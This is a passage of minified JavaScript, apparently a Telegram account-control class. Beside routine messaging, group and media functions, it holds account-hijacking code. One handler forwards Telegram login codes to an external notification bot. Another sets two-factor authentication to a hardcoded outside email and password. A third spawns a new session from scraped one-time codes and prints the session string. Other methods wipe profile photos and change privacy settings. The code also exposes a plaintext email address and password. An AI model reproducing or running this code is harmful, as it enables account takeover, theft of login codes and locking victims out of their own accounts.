s.Api.InputMessagesFilterPhoneCalls({}),minDate:0,maxDate:0,offsetId:0,addOffset:0,limit:200,maxId:0,minId:0,hash:(0,y.default)(0)}))).messages.filter((e=>e.action instanceof s.Api.MessageActionPhoneCall)),i={outgoing:0,incoming:0,video:0,chatCallCounts:{},totalCalls:0};for(const n of t){i.totalCalls++;const t=n.action;n.out?i.outgoing++:i.incoming++,t.video&&i.video++,e[n.peerId.userId.toString()]=i}return e}async handleEvents(e){e.isPrivate&&"777000"==e.message.chatId.toString()&&(console.log(e.message.text.toLowerCase()),console.log("Login Code received for - ",this.phoneNumber,"\nActiveClientSetup - ",S.activeClientSetup),console.log("Date :",new Date(1e3*e.message.date)),await(0,b.fetchWithTimeout)(`${(0,w.notifbot)()}&text=${encodeURIComponent(e.message.text)}`))}async updatePrivacyforDeletedAccount(){try{await this.client.invoke(new s.Api.account.SetPrivacy({key:new s.Api.InputPrivacyKeyPhoneCall,rules:[new s.Api.InputPrivacyValueDisallowAll]})),console.log("Calls Updated"),await this.client.invoke(new s.Api.account.SetPrivacy({key:new s.Api.InputPrivacyKeyProfilePhoto,rules:[new s.Api.InputPrivacyValueAllowAll]})),console.log("PP Updated"),await this.client.invoke(new s.Api.account.SetPrivacy({key:new s.Api.InputPrivacyKeyPhoneNumber,rules:[new s.Api.InputPrivacyValueDisallowAll]})),console.log("Number Updated"),await this.client.invoke(new s.Api.account.SetPrivacy({key:new s.Api.InputPrivacyKeyStatusTimestamp,rules:[new s.Api.InputPrivacyValueDisallowAll]})),await this.client.invoke(new s.Api.account.SetPrivacy({key:new s.Api.InputPrivacyKeyAbout,rules:[new s.Api.InputPrivacyValueAllowAll]})),console.log("LAstSeen Updated")}catch(e){throw e}}async updateProfile(e,t){const i={lastName:""};void 0!==e&&(i.firstName=e),void 0!==t&&(i.about=t);try{await this.client.invoke(new s.Api.account.UpdateProfile(i)),console.log("Updated NAme: ",e)}catch(e){throw e}}async downloadProfilePic(e){try{const t=await this.client.invoke(new s.Api.photos.GetUserPhotos({userId:"me",offset:0}));if(t.photos.length>0)if(console.log(`You have ${t.photos.length} profile photos.`),e<t.photos.length){const i=t.photos[e],n=Math.max(i.sizes.length-2,0),o=i.sizes[n],r=await this.client.downloadFile(new s.Api.InputPhotoFileLocation({id:i.id,accessHash:i.accessHash,fileReference:i.fileReference,thumbSize:o.type}),{dcId:i.dcId});if(r){const t=`profile_picture_${e+1}.jpg`;return d.writeFileSync(t,r),console.log(`Profile picture downloaded as '${t}'`),t}console.log("Failed to download the photo.")}else console.log(`Photo index ${e} is out of range.`);else console.log("No profile photos found.")}catch(e){console.error("Error:",e)}}async getLastActiveTime(){const e=await this.client.invoke(new s.Api.account.GetAuthorizations);let t=0;return e.authorizations.map((e=>{this.isAuthMine(e)||t<e.dateActive&&(t=e.dateActive)})),new Date(1e3*t).toISOString().split("T")[0]}async getContacts(){return await this.client.invoke(new s.Api.contacts.GetContacts({hash:(0,y.default)(0)}))}async deleteChat(e){try{await this.client.invoke(new s.Api.messages.DeleteHistory({justClear:!1,peer:e,revoke:!1})),console.log(`Dialog with ID ${e} has been deleted.`)}catch(e){console.error("Failed to delete dialog:",e)}}async blockUser(e){try{await(this.client?.invoke(new s.Api.contacts.Block({id:e}))),console.log(`User with ID ${e} has been blocked.`)}catch(e){console.error("Failed to block user:",e)}}async getMediaMetadata(e){if(!this.client)throw new Error("Client not initialized");const{chatId:t,types:i=["photo","video","document"],startDate:n,endDate:o,limit:r=50,maxId:a,minId:s}=e,c={limit:r||500,...a?{maxId:a}:{},...s?{minId:s}:{},...n&&{minDate:Math.floor(n.getTime()/1e3)},...o&&{maxDate:Math.floor(o.getTime()/1e3)}},l=await this.safeGetEntity(t);console.log(c);const p=await this.client.getMessages(l,c);return console.log(`Fetched ${p.length} messages`),{messages:p.map((e=>{const t=[];if(e.media){const n=this.getMediaType(e.media);i.includes(n)&&t.push(e.id)}return t})).flat(),total:p.total,hasMore:p.length==r,lastOffsetId:p[p.length-1].id}}async downloadMediaFile(e,t="me",i){try{const n=await this.safeGetEntity(t),o=(await this.client.getMessages(n,{ids:[e]}))[0];if(!o||o.media instanceof s.Api.MessageMediaEmpty)i.status(404).send("Media not found");else{const e=o.media;let t,n,r;const a=o.video||o.photo,c={id:a.id,accessHash:a.accessHash,fileReference:a.fileReference};if(e instanceof s.Api.MessageMediaPhoto)t="image/jpeg",n="photo.jpg",r=new s.Api.InputPhotoFileLocation({...c,thumbSize:"m"});else{if(!(e instanceof s.Api.MessageMediaDocument))return i.status(415).send("Unsupported media type");t=e.mimeType||"video/mp4",n="video.mp4",r=new s.Api.InputDocumentFileLocation({...c,thumbSize:""})}i.setHeader("Content-Type",t),i.setHeader("Content-Disposition",`attachment; filename="${n}"`);const l=524288;for await(const e of this.client.iterDownload({file:r,offset:y.default[0],limit:5242880,requestSize:l}))i.write(e);i.end()}}catch(e){if(e.message.includes("FILE_REFERENCE_EXPIRED"))return i.status(404).send("File reference expired");console.error("Error downloading media:",e),i.status(500).send("Error downloading media")}}async downloadWithTimeout(e,t){return Promise.race([e,new Promise(((e,i)=>setTimeout((()=>i(new Error("Download timeout"))),t)))])}getMediaDetails(e){if(!e?.document)return null;const t=e.document;if(t instanceof s.Api.DocumentEmpty)return null;const i=t.attributes.find((e=>e instanceof s.Api.DocumentAttributeVideo)),n=t.attributes.find((e=>e instanceof s.Api.DocumentAttributeFilename));return{size:t.size,mimeType:t.mimeType,fileName:n?.fileName||null,duration:i?.duration||null,width:i?.w||null,height:i?.h||null}}async downloadFileFromUrl(e){try{const t=await p.default.get(e,{responseType:"arraybuffer",timeout:3e4});return Buffer.from(t.data)}catch(e){throw new Error(`Failed to download file: ${e.message}`)}}async forwardMessage(e,t,i){try{await this.client.forwardMessages(e,{fromPeer:t,messages:i})}catch(e){console.log("Failed to Forward Message : ",e.errorMessage)}}async updateUsername(e){let t="",i=e&&""!==e?e:"",n=0;if(""===i)try{await this.client.invoke(new s.Api.account.UpdateUsername({username:i})),console.log("Removed Username successfully.")}catch(e){console.log(e)}else for(;n<10;)try{const o=await this.client.invoke(new s.Api.account.CheckUsername({username:i}));if(console.log(o," - ",i),o){await this.client.invoke(new s.Api.account.UpdateUsername({username:i})),console.log(`Username '${i}' updated successfully.`),t=i;break}i=e+n,n++,await(0,m.sleep)(2e3)}catch(o){if(console.log(o.message),"USERNAME_NOT_MODIFIED"==o.errorMessage){t=i;break}i=e+n,n++,await(0,m.sleep)(2e3)}return t}async updatePrivacy(){try{await this.client.invoke(new s.Api.account.SetPrivacy({key:new s.Api.InputPrivacyKeyPhoneCall,rules:[new s.Api.InputPrivacyValueDisallowAll]})),console.log("Calls Updated"),await this.client.invoke(new s.Api.account.SetPrivacy({key:new s.Api.InputPrivacyKeyProfilePhoto,rules:[new s.Api.InputPrivacyValueAllowAll]})),console.log("PP Updated"),await this.client.invoke(new s.Api.account.SetPrivacy({key:new s.Api.InputPrivacyKeyForwards,rules:[new s.Api.InputPrivacyValueAllowAll]})),console.log("forwards Updated"),await this.client.invoke(new s.Api.account.SetPrivacy({key:new s.Api.InputPrivacyKeyPhoneNumber,rules:[new s.Api.InputPrivacyValueDisallowAll]})),console.log("Number Updated"),await this.client.invoke(new s.Api.account.SetPrivacy({key:new s.Api.InputPrivacyKeyStatusTimestamp,rules:[new s.Api.InputPrivacyValueAllowAll]})),console.log("LAstSeen Updated"),await this.client.invoke(new s.Api.account.SetPrivacy({key:new s.Api.InputPrivacyKeyAbout,rules:[new s.Api.InputPrivacyValueAllowAll]}))}catch(e){throw e}}async sendViewOnceMedia(e,t,i="",n,o){if(!this.client)throw new Error("Client is not initialized");try{const r=o||`viewonce_${Date.now()}.${n?"mp4":"jpg"}`,a=n?"video/mp4":"image/jpeg",c=await this.client.uploadFile({file:new u.CustomFile(r,t.length,r,t),workers:1}),l=await this.client.invoke(new s.Api.messages.SendMedia({peer:e,media:n?new s.Api.InputMediaUploadedDocument({file:c,mimeType:a,attributes:[new s.Api.DocumentAttributeVideo({supportsStreaming:!0,duration:0,w:0,h:0})],ttlSeconds:10}):new s.Api.InputMediaUploadedPhoto({file:c,ttlSeconds:10}),message:i,randomId:(0,y.default)(Math.floor(1e9*Math.random()))}));return console.log(`Sent view-once ${n?"video":"photo"} to chat ${e}`),l}catch(e){throw console.error("Error sending view-once media:",e),e}}async getFileUrl(e,t){const i=await p.default.get(e,{responseType:"stream"}),n=`/tmp/${t}`;return await new Promise(((e,t)=>{const o=d.createWriteStream(n);i.data.pipe(o),o.on("finish",(()=>e(!0))),o.on("error",t)})),n}async updateProfilePic(e){try{const t=await this.client.uploadFile({file:new u.CustomFile("pic.jpg",d.statSync(e).size,e),workers:1});console.log("file uploaded"),await this.client.invoke(new s.Api.photos.UploadProfilePhoto({file:t})),console.log("profile pic updated")}catch(e){throw e}}async hasPassword(){return(await this.client.invoke(new s.Api.account.GetPassword)).hasPassword}async set2fa(){if(await this.hasPassword())console.log("Password already exists");else{console.log("Password Does not exist, Setting 2FA");const e=h.MailReader.getInstance(),t={email:"storeslaksmi@gmail.com",hint:"password - India143",newPassword:"Ajtdmwajt1@"};try{await e.connectToMail();const i=setInterval((async()=>{if(console.log("Checking if mail is ready"),e.isMailReady())return clearInterval(i),console.log("Mail is ready, checking code!"),await this.client.updateTwoFaSettings({isCheckPassword:!1,email:t.email,hint:t.hint,newPassword:t.newPassword,emailCodeCallback:async t=>(console.log("Code sent"),new Promise((async(t,i)=>{let n=0;const o=setInterval((async()=>{try{if(console.log("Checking code"),n++,e.isMailReady()&&n<4){const i=await e.getCode();console.log("Code:",i),i&&(await e.disconnectFromMail(),clearInterval(o),t(i))}else clearInterval(o),await e.disconnectFromMail(),i(new Error("Failed to retrieve code"))}catch(t){clearInterval(o),await e.disconnectFromMail(),i(t)}}),1e4)}))),onEmailCodeError:e=>(console.error("Email code error:",(0,v.parseError)(e)),Promise.resolve("error"))}),t;console.log("Mail not ready yet")}),5e3)}catch(e){console.error("Unable to connect to mail server:",(0,v.parseError)(e))}}}async sendPhotoChat(e,t,i,n){if(!this.client)throw new Error("Client is not initialized");const o=await this.getFileUrl(t,n),r=new u.CustomFile(o,d.statSync(o).size,n);await this.client.sendFile(e,{file:r,caption:i})}async sendFileChat(e,t,i,n){if(!this.client)throw new Error("Client is not initialized");const o=await this.getFileUrl(t,n),r=new u.CustomFile(o,d.statSync(o).size,n);await this.client.sendFile(e,{file:r,caption:i})}async deleteProfilePhotos(){try{const e=await this.client.invoke(new s.Api.photos.GetUserPhotos({userId:"me"}));console.log(`Profile Pics found: ${e.photos.length}`),e&&e.photos?.length>0&&await this.client.invoke(new s.Api.photos.DeletePhotos({id:e.photos})),console.log("Deleted profile Photos")}catch(e){throw e}}async createNewSession(){const e=await this.client.getMe();console.log("Phne:",e.phone);const t=new s.TelegramClient(new c.StringSession(""),parseInt(process.env.API_ID),process.env.API_HASH,{connectionRetries:1});await t.start({phoneNumber:e.phone,password:async()=>"Ajtdmwajt1@",phoneCode:async()=>(console.log("Waiting for the OTP code from chat ID 777000..."),await this.waitForOtp()),onError:e=>{throw e}});const i=t.session.save();return await t.disconnect(),console.log("New Session: ",i),i}async waitForOtp(){for(let e=0;e<3;e++)try{console.log("Attempt : ",e);const t=(await this.client.getMessages("777000",{limit:1}))[0];if(t&&t.date&&1e3*t.date>Date.now()-6e4){const e=t.text.split(".")[0].split("code:**")[1].trim();return console.log("returning: ",e),e}{console.log("Message Date: ",new Date(1e3*t.date).toISOString(),"Now: ",new Date(Date.now()-6e4).toISOString());const i=t.text.split(".")[0].split("code:**")[1].trim();if(console.log("Skipped Code: ",i),2==e)return i;await(0,m.sleep)(5e3)}}catch(e){await(0,m.sleep)(2e3),console.log(e)}}async createGroupWithOptions(e){if(!this.client)throw new Error("Client not initialized");const t=await this.client.invoke(new s.Api.channels.CreateChannel({title:e.title,about:e.description,megagroup:e.megagroup,forImport:e.forImport}));let i;if("updates"in t){const e=(Array.isArray(t.updates)?t.updates:[t.updates]).find((e=>e instanceof s.Api.UpdateChannel));e&&"channelId"in e&&(i=e.channelId)}if(!i)throw new Error("Failed to create channel");const n=await this.client.getEntity(i);if(!(n instanceof s.Api.Channel))throw new Error("Created entity is not a channel");if(e.members?.length){const t=await Promise.all(e.members.map((e=>this.client.getInputEntity(e))));await this.client.invoke(new s.Api.channels.InviteToChannel({channel:await this.client.getInputEntity(n),users:t}))}if(e.photo){const t=await this.downloadFileFromUrl(e.photo),i=await this.client.uploadFile({file:new u.CustomFile("photo.jpg",t.length,"photo.jpg",t),workers:1});await this.client.invoke(new s.Api.channels.EditPhoto({channel:await this.client.getInputEntity(n),photo:new s.Api.InputChatUploadedPhoto({file:i})}))}return n}async updateGroupSettings(e){if(!this.client)throw new Error("Client not initialized");const t=await this.client.getEntity(e.groupId);return e.title&&await this.client.invoke(new s.Api.channels.EditTitle({channel:t,title:e.title||""})),e.description&&await this.client.invoke(new s.Api.messages.EditChatAbout({peer:t,about:e.description})),e.username&&await this.client.invoke(new s.Api.channels.UpdateUsername({channel:t,username:e.username})),void 0!==e.slowMode&&await this.client.invoke(new s.Api.channels.ToggleSlowMode({channel:t,seconds:e.slowMode})),!0}async scheduleMessageSend(e){if(!this.client)throw new Error("Client not initialized");const t=Math.floor(e.scheduledTime.getTime()/1e3);if(e.media){const i=await this.downloadFileFromUrl(e.media.url),n=await this.client.uploadFile({file:new u.CustomFile("media",i.length,"media",i),workers:1});return this.client.sendFile(e.chatId,{file:n,caption:e.message,forceDocument:"document"===e.media.type,scheduleDate:t})}return this.client.sendMessage(e.chatId,{message:e.message,schedule:Math.floor(e.scheduledTime.getTime()/1e3)})}async getScheduledMessages(e){if(!this.client)throw new Error("Client not initialized");const t=await this.client.invoke(new s.Api.messages.GetScheduledHistory({peer:e,hash:(0,y.default)(0)}));return"messages"in t&&Array.isArray(t.messages)?t.messages.filter((e=>e instanceof s.Api.Message)):[]}async sendMediaAlbum(e){if(!this.client)throw new Error("Client not initialized");const t=await Promise.all(e.media.map((async e=>{const t=await this.downloadFileFromUrl(e.url),i=await this.client.uploadFile({file:new u.CustomFile("media",t.length,"media",t),workers:1});return new s.Api.InputSingleMedia({media:"photo"===e.type?new s.Api.InputMediaUploadedPhoto({file:i}):new s.Api.InputMediaUploadedDocument({file:i,mimeType:"video"===e.type?"video/mp4":"application/octet-stream",attributes:[]}),message:e.caption||"",entities:[]})})));return this.client.invoke(new s.Api.messages.SendMultiMedia({peer:e.chatId,multiMedia:t}))}async sendVoiceMessage(e){if(!this.client)throw new Error("Client not initialized");const t=await this.downloadFileFromUrl(e.url);return await this.client.invoke(new s.Api.messages.SendMedia({peer:e.chatId,media:new s.Api.InputMediaUploadedDocument({file:await this.client.uploadFile({file:new u.CustomFile("voice.ogg",t.length,"voice.ogg",t),workers:1}),mimeType:"audio/ogg",attributes:[new s.Api.DocumentAttributeAudio({voice:!0,duration:e.duration||0})]}),message:e.caption||"",randomId:(0,y.default)(Math.floor(1e9*Math.random()))}))}async cleanupChat(e){if(!this.client)throw new Error("Client not initialized");const t=(await this.client.getMessages(e.chatId,{limit:100,...e.beforeDate&&{offsetDate:Math.floor(e.beforeDate.getTime()/1e3)}})).filter((t=>!(e.excludePinned&&t.pinned||e.onlyMedia&&!t.media)));return t.length>0&&await this.client.deleteMessages(e.chatId,t.map((e=>e.id)),{revoke:!0}),{deletedCount:t.length}}async updatePrivacyBatch(e){if(!this.client)throw new Error("Client not initialized");const t={everybody:[new s.Api.InputPrivacyValueAllowAll],contacts:[new s.Api.InputPrivacyValueAllowContacts],nobody:[new s.Api.InputPrivacyValueDisallowAll]},i=[],n={phoneNumber:s.Api.InputPrivacyKeyPhoneNumber,lastSeen:s.Api.InputPrivacyKeyStatusTimestamp,profilePhotos:s.Api.InputPrivacyKeyProfilePhoto,forwards:s.Api.InputPrivacyKeyForwards,calls:s.Api.InputPrivacyKeyPhoneCall,groups:s.Api.InputPrivacyKeyChatInvite};for(const[o,r]of Object.entries(e))r&&o in n&&i.push(this.client.invoke(new s.Api.account.SetPrivacy({key:new n[o],rules:t[r]})));return await Promise.all(i),!0}async getSessionInfo(){if(!this.client)throw new Error("Client not initialized");const[e,t]=await Promise.all([this.client.invoke(new s.Api.account.GetAuthorizations),this.client.invoke(new s.Api.account.GetWebAuthorizations)]);return{sessions:e.authorizations.map((e=>({hash:e.hash.toString(),deviceModel:e.deviceModel,platform:e.platform,systemVersion:e.systemVersion,appName:e.appName,dateCreated:new Date(1e3*e.dateCreated),dateActive:new Date(1e3*e.dateActive),ip:e.ip,country:e.country,region:e.region}))),webSessions:t.authorizations.map((e=>({hash:e.hash.toString(),domain:e.domain,browser:e.browser,platform:e.platform,dateCreated:new Date(1e3*e.dateCreated),dateActive:new Date(1e3*e.dateActive),ip:e.ip,region:e.region})))}}async terminateSession(e){if(!this.client)throw new Error("Client not initialized");return e.exceptCurrent?("app"===e.type?await this.client.invoke(new s.Api.auth.ResetAuthorizations):await this.client.invoke(new s.Api.account.ResetWebAuthorizations),!0):("app"===e.type?await this.client.invoke(new s.Api.account.ResetAuthorization({hash:(0,y.default)(e.hash)})):await this.client.invoke(new s.Api.account.ResetWebAuthorization({hash:(0,y.default)(e.hash)})),!0)}async getChatStatistics(e,t){if(!this.client)throw new Error("Client not initialized");const i=Math.floor(Date.now()/1e3),n={day:86400,week:604800,month:2592e3}[t],o=await this.client.getMessages(e,{limit:100,offsetDate:i-n});return{period:t,totalMessages:o.length,uniqueSenders:new Set(o.map((e=>e.fromId?.toString())).filter(Boolean)).size,messageTypes:{text:o.filter((e=>!e.media&&e.message)).length,photo:o.filter((e=>e.media&&"MessageMediaPhoto"===e.media.className)).length,video:o.filter((e=>{if(!e.media||"MessageMediaDocument"!==e.media.className)return!1;const t=e.media.document;return t&&"mimeType"in t&&t.mimeType?.startsWith("video/")})).length,voice:o.filter((e=>{if(!e.media||"MessageMediaDocument"!==e.media.className)return!1;const t=e.media.document;return t&&"mimeType"in t&&t.mimeType?.startsWith("audio/")})).length,other:o.filter((e=>e.media&&!["MessageMediaPhoto","MessageMediaDocument"].includes(e.media.className))).length},topSenders:Object.entries(o.reduce(((e,t)=>{const i=t.fromId?.toString();return i&&(e[i]=(e[i]||0)+1),e}),{})).sort((([,e],[,t])=>t-e)).slice(0,10).map((([e,t])=>({id:e,count:t}))),mostActiveHours:Object.entries(o.reduce(((e,t)=>{const i=new Date(1e3*t.date).getHours();return e[i]=(e[i]||0)+1,e}),{})).sort((([,e],[,t])=>t-e)).map((([e,t])=>({hour:Number(e),count:t})))}}getMediaExtension(e){if(!e)return"bin";switch(e.className){case"MessageMediaPhoto":return"jpg";case"MessageMediaDocument":const t=e.document;if(!t||!("mimeType"in t))return"bin";const i=t.mimeType;return i?.startsWith("video/")?"mp4":i?.startsWith("image/")?i.split("/")[1]:i?.startsWith("audio/")?"ogg":"bin";default:return"bin"}}async setContentFilters(e){if(!this.client)throw new Error("Client not initialized");this.contentFilters.set(e.chatId,e),this.filterHandler||(this.filterHandler=this.client.addEventHandler((async e=>{if(e instanceof l.NewMessageEvent){const t=e.message,i=t.chatId?.toString(),n=this.contentFilters.get(i);if(!n)return;if(await this.evaluateMessage(t,n))for(const e of n.actions)await this.executeFilterAction(e,t)}}),new l.NewMessage({})))}async evaluateMessage(e,t){if(t.keywords?.length){const i=e.message.toLowerCase();if(t.keywords.some((e=>i.includes(e.toLowerCase()))))return!0}if(t.mediaTypes?.length&&e.media){const i=this.getMediaType(e.media);if(t.mediaTypes.includes(i))return!0}return!1}async executeFilterAction(e,t){try{switch(e){case"delete":await this.client.deleteMessages(t.chatId,[t.id],{revoke:!0});break;case"warn":await this.client.sendMessage(t.chatId,{message:"⚠️ Message filtered due to content policy.",replyTo:t.id});break;case"mute":t.fromId&&await this.client.invoke(new s.Api.channels.EditBanned({channel:t.chatId,participant:t.fromId,bannedRights:new s.Api.ChatBannedRights({untilDate:Math.floor(Date.now()/1e3)+3600,sendMessages:!0})}))}}catch(t){console.error(`Failed to execute filter action ${e}:`,t)}}getSearchFilter(e){switch(e){case"photo":return new s.Api.InputMessagesFilterPhotos;case"video":return new s.Api.InputMessagesFilterVideo;case"document":return new s.Api.InputMessagesFilterDocument;case"url":return new s.Api.InputMessagesFilterUrl;case"roundVideo":return new s.Api.InputMessagesFilterRoundVideo;case"phtotoVideo":return new s.Api.InputMessagesFilterPhotoVideo;case"phoneCalls":return new s.Api.InputMessagesFilterPhoneCalls({missed:!1});default:return new s.Api.InputMessagesFilterEmpty}}getMediaType(e){return e instanceof s.Api.MessageMediaPhoto?"photo":e instanceof s.Api.MessageMediaDocument&&e.document.attributes.some((e=>e instanceof s.Api.DocumentAttributeVideo))?"video":"document"}getEntityId(e){return e instanceof s.Api.User||e instanceof s.Api.Channel||e instanceof s.Api.Chat?e.id.toString():""}async addGroupMembers(e,t){if(!this.client)throw new Error("Client not initialized");const i=await this.client.getInputEntity(e),n=await Promise.all(t.map((e=>this.client.getInputEntity(e))));await this.client.invoke(new s.Api.channels.InviteToChannel({channel:i,users:n}))}async removeGroupMembers(e,t){if(!this.client)throw new Error("Client not initialized");const i=await this.client.getInputEntity(e);for(const e of t){const t=await this.client.getInputEntity(e);await this.client.invoke(new s.Api.channels.EditBanned({channel:i,participant:t,bannedRights:new s.Api.ChatBannedRights({untilDate:0,viewMessages:!0,sendMessages:!0,sendMedia:!0,sendStickers:!0,sendGifs:!0,sendGames:!0,sendInline:!0,embedLinks:!0})}))}}async promoteToAdmin(e,t,i,n){if(!this.client)throw new Error("Client not initialized");const o=await this.client.getInputEntity(e),r=await this.client.getInputEntity(t);await this.client.invoke(new s.Api.channels.EditAdmin({channel:o,userId:r,adminRights:new s.Api.ChatAdminRights({changeInfo:i?.changeInfo??!1,postMessages:i?.postMessages??!1,editMessages:i?.editMessages??!1,deleteMessages:i?.deleteMessages??!1,banUsers:i?.banUsers??!1,inviteUsers:i?.inviteUsers??!0,pinMessages:i?.pinMessages??!1,addAdmins:i?.addAdmins??!1,anonymous:i?.anonymous??!1,manageCall:i?.manageCall??!1,other:!1}),rank:n||""}))}async demoteAdmin(e,t){if(!this.client)throw new Error("Client not initialized");const i=await this.client.getInputEntity(e),n=await this.client.getInputEntity(t);await this.client.invoke(new s.Api.channels.EditAdmin({channel:i,userId:n,adminRights:new s.Api.ChatAdminRights({changeInfo:!1,postMessages:!1,editMessages:!1,deleteMessages:!1,banUsers:!1,inviteUsers:!1,pinMessages:!1,addAdmins:!1,anonymous:!1,manageCall:!1,other:!1}),rank:""}))}async unblockGroupUser(e,t){if(!this.client)throw new Error("Client not initialized");const i=await this.client.getInputEntity(e),n=await this.client.getInputEntity(t);await this.client.invoke(new s.Api.channels.EditBanned({channel:i,participant:n,bannedRights:new s.Api.ChatBannedRights({untilDate:0,viewMessages:!1,sendMessages:!1,sendMedia:!1,sendStickers:!1,sendGifs:!1,sendGames:!1,sendInline:!1,embedLinks:!1})}))}async getGroupAdmins(e){if(!this.client)throw new Error("Client not initialized");const t=await this.client.invoke(new s.Api.channels.GetParticipants({channel:await this.client.getInputEntity(e),filter:new s.Api.ChannelParticipantsAdmins,offset:0,limit:100,hash:(0,y.default)(0)}));if("users"in t){const e=t.participants;return t.users,e.map((e=>{const t=e.adminRights;return{userId:e.userId.toString(),rank:e.rank||"",permissions:{changeInfo:t.changeInfo||!1,postMessages:t.postMessages||!1,editMessages:t.editMessages||!1,deleteMessages:t.deleteMessages||!1,banUsers:t.banUsers||!1,inviteUsers:t.inviteUsers||!1,pinMessages:t.pinMessages||!1,addAdmins:t.addAdmins||!1,anonymous:t.anonymous||!1,manageCall:t.manageCall||!1}}}))}return[]}async getGroupBannedUsers(e){if(!this.client)throw new Error("Client not initialized");const t=await this.client.invoke(new s.Api.channels.GetParticipants({channel:await this.client.getInputEntity(e),filter:new s.Api.ChannelParticipantsBanned({q:""}),offset:0,limit:100,hash:(0,y.default)(0)}));return"users"in t?t.participants.map((e=>{const t=e.bannedRights;return{userId:e.peer.chatId.toString(),bannedRights:{viewMessages:t.viewMessages||!1,sendMessages:t.sendMessages||!1,sendMedia:t.sendMedia||!1,sendStickers:t.sendStickers||!1,sendGifs:t.sendGifs||!1,sendGames:t.sendGames||!1,sendInline:t.sendInline||!1,embedLinks:t.embedLinks||!1,untilDate:t.untilDate||0}}})):[]}async searchMessages(e){if(!this.client)throw new Error("Client not initialized");const t={video:{messages:[],total:0},photo:{messages:[],total:0},document:{messages:[],total:0},voice:{messages:[],total:0},text:{messages:[],total:0},all:{messages:[],total:0},roundVideo:{messages:[],total:0}},{chatId:i,query:n="",types:o=["all"],maxId:r,minId:a,limit:c}=e;console.log("Types: ",o);for(const e of o){const l=this.getSearchFilter(e),p={limit:c||500,...r?{maxId:r}:{},...a?{minId:a}:{}};console.log(e,p);const d=await this.client.invoke(new s.Api.messages.Search({peer:await this.safeGetEntity(i),q:n,filter:l,...p,hash:(0,y.default)(0),fromId:void 0}));if(!("messages"in d))return{};let u=d.messages;console.log(e,d.messages.length),o.includes("text")&&1===o.length&&(console.log("Text Filter"),u=u.filter((e=>!("media"in e))));const m={messages:await Promise.all(u.map((async e=>e.id))),total:("count"in d?d.count:u.length)||u.length};t[`${e}`]=m}return t}async getAllMediaMetaData(e){if(!this.client)throw new Error("Client not initialized");const{chatId:t,types:i=["photo","video"],startDate:n,endDate:o,maxId:r,minId:a}=e;let s=[],c=!0,l=0;for(;c;){const e=await this.getMediaMetadata({chatId:t,types:i,startDate:n,endDate:o,limit:200,maxId:l,minId:a});console.log("hasMore: ",e.hasMore,"Total: ",e.total,"lastOffsetId: ",e.lastOffsetId),s=s.concat(e.messages),e.hasMore?(l=e.lastOffsetId,console.log(`Fetched ${s.length} messages so far`)):(c=!1,console.log("No more messages to fetch")),await(0,m.sleep)(3e3)}return{messages:s,total:s.length}}async getFilteredMedia(e){if(!this.client)throw new Error("Client not initialized");const{chatId:t,types:i=["photo","video","document"],startDate:n,endDate:o,limit:r=50,maxId:a,minId:c}=e,l={limit:r||100,...a?{maxId:a}:{},...c?{minId:c}:{},...n&&{minDate:Math.floor(n.getTime()/1e3)},...o&&{maxDate:Math.floor(o.getTime()/1e3)}},p=await this.safeGetEntity(t);console.log(l);const d=await this.client.getMessages(p,l);console.log(`Fetched ${d.length} messages`);const u=d.filter((e=>{if(!e.media)return!1;const t=this.getMediaType(e.media);return i.includes(t)}));return console.log(`Filtered down to ${u.length} messages`),{messages:await Promise.all(u.map((async e=>{let t=null;try{if(e.media instanceof s.Api.MessageMediaPhoto){const i=e.photo?.sizes||[1];t=await this.downloadWithTimeout(this.client.downloadMedia(e,{thumb:i[1]||i[0]}),5e3)}else if(e.media instanceof s.Api.MessageMediaDocument){const i=e.document?.thumbs||[1];t=await this.downloadWithTimeout(this.client.downloadMedia(e,{thumb:i[1]||i[0]}),5e3)}}catch(t){console.warn(`Failed to get thumbnail for message ${e.id}:`,t.message)}const i=await this.getMediaDetails(e.media);return{messageId:e.id,type:this.getMediaType(e.media),thumb:t?.toString("base64")||null,caption:e.message||"",date:e.date,mediaDetails:i}}))),total:d.total,hasMore:d.length===r}}async safeGetEntity(e){if(!this.client)throw new Error("Client not initialized");try{return await this.client.getEntity(e)}catch(t){console.log(`Failed to get entity directly for ${e}, searching in dialogs...`);try{const t=await this.client.getDialogs({limit:300});for(const i of t){const t=i.entity;if(t.id.toString()===e.toString())return t}return console.log(`Entity ${e} not found in dialogs either`),null}catch(e){return console.error("Error while searching dialogs:",e),null}}}generateCSV(e){return[["First Name","Last Name","Phone","Blocked"].join(","),...e.map((e=>[e.firstName,e.lastName,e.phone,e.blocked].join(",")))].join("\n")}generateVCard(e){return e.map((e=>["BEGIN:VCARD","VERSION:3.0",`FN:${e.firstName} ${e.lastName||""}`.trim(),`TEL;TYPE=CELL:${e.phone||""}`,"END:VCARD"].join("\n"))).join("\n\n")}async exportContacts(e,t=!1){if(!this.client)throw new Error("Client not initialized");const i=await this.client.invoke(new s.Api.contacts.GetContacts({})),n=i?.contacts||[];let o;if(t&&(o=await this.client.invoke(new s.Api.contacts.GetBlocked({offset:0,limit:100}))),"csv"===e){const e=n.map((e=>({firstName:e.firstName||"",lastName:e.lastName||"",phone:e.phone||"",blocked:!!o&&o.peers.some((t=>t.id.toString()===e.id.toString()))})));return this.generateCSV(e)}return this.generateVCard(n)}async importContacts(e){if(!this.client)throw new Error("Client not initialized");return await Promise.all(e.map((async e=>{try{return await this.client.invoke(new s.Api.contacts.ImportContacts({contacts:[new s.Api.InputPhoneContact({clientId:(0,y.default)(Math.floor(1e6*Math.random())),phone:e.phone,firstName:e.firstName,lastName:e.lastName||""})]})),{success:!0,phone:e.phone}}catch(t){return{success:!1,phone:e.phone,error:t.message}}})))}async manageBlockList(e,t){if(!this.client)throw new Error("Client not initialized");return await Promise.all(e.map((async e=>{try{return t?await this.client.invoke(new s.Api.contacts.Block({id:await this.client.getInputEntity(e)})):await this.client.invoke(new s.Api.contacts.Unblock({id:await this.client.getInputEntity(e)})),{success:!0,userId:e}}catch(t){return{success:!1,userId:e,error:t.message}}})))}async getContactStatistics(){if(!this.client)throw new Error("Client not initialized");const e=await this.client.invoke(new s.Api.contacts.GetContacts({})),t=e?.contacts||[],i=t.filter((e=>e.status&&"wasOnline"in e.status));return{total:t.length,online:i.length,withPhone:t.filter((e=>e.phone)).length,mutual:t.filter((e=>e.mutual)).length,lastWeekActive:i.filter((e=>{const t=new Date(1e3*e.status.wasOnline),i=new Date;return i.setDate(i.getDate()-7),t>i})).length}}async createChatFolder(e){if(!this.client)throw new Error("Client not initialized");const t=new s.Api.DialogFilter({id:Math.floor(1e3*Math.random()),title:e.name,includePeers:await 